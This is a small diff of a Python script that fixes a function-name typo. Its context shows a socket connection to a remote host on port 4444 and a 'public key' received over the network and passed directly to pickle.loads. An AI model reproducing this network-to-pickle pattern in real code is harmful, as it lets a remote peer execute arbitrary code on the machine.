@@ -12,11 +12,11 @@ RPORT = 4444
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
 
-def recieve_key():
+def receive_key():
     data_key = s.recv(1024)
     return data_key
 
-pickled_publickey = recieve_key()
+pickled_publickey = receive_key()
 public_key = pickle.loads(pickled_publickey)
 
 
